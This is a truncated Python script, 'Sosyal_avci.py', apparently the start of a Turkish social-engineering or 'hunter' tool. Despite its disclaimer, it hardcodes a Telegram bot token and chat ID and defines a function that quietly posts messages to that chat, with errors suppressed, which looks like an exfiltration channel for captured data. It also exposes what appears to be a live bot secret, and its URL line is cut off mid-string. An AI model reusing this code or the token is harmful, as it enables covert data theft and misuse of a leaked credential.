# Sosyal_avci.py
Kötü amaçlı kullanıma uygun degildir!!! 
import os
import time
import requests
import random
from colorama import Fore, Style, init

init(autoreset=True)

# --- SENIN AYARLARIN ---
TOKEN = "8727514473:AAFCY_AyUnljwKFgTkoxpWqIh-ihiw7psfU"
CHAT_ID = "7053015463"

def telegram_mesaj_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessa>
        data = {"chat_id": CHAT_ID, "text": mesaj}
        requests.post(url, data=data)
    except: pass

def temizle():
    os.system('clear')

def renk_gecisi():
    # Her girişte değişen modern renk çiftleri
    temalar = [
        (Fore.MAGENTA, Fore.BLUE),   # Mor -> Mavi
        (Fore.YELLOW, Fore.GREEN),   # Sarı -> Yeşil
        (Fore.CYAN, Fore.WHITE),     # Turkuaz -> Beyaz
        (Fore.RED, Fore.YELLOW)      # Kırmızı -> Sarı
    ]
    return random.choice(temalar)

def havali_banner(r1, r2
